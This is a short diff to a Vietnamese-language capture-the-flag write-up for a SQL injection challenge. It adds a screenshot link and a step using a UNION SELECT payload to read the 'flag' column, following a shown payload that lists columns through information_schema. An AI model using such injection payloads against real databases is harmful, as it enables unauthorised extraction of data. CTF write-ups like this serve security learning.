@@ -14,6 +14,11 @@
 
 * Tiếp tục tìm tất cả các cột trong bảng ```flag``` bằng lệnh ```' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='flag'-- -``` và tìm ra cột ```flag```
 
+![img](https://github.com/dnamgithub33/wu_svattt/blob/04f497a7f1b4f03bd581bb728da75286bdc4e25f/img/flag.PNG)
+
+* Đã biết cột và bảng có thể chứa flag rồi ta dùng lệnh ```' UNION SELECT NULL,flag,NULL FROM flag-- -``` để truy xuất nội dung trong cột ```flag```
+
+!
 
 
 
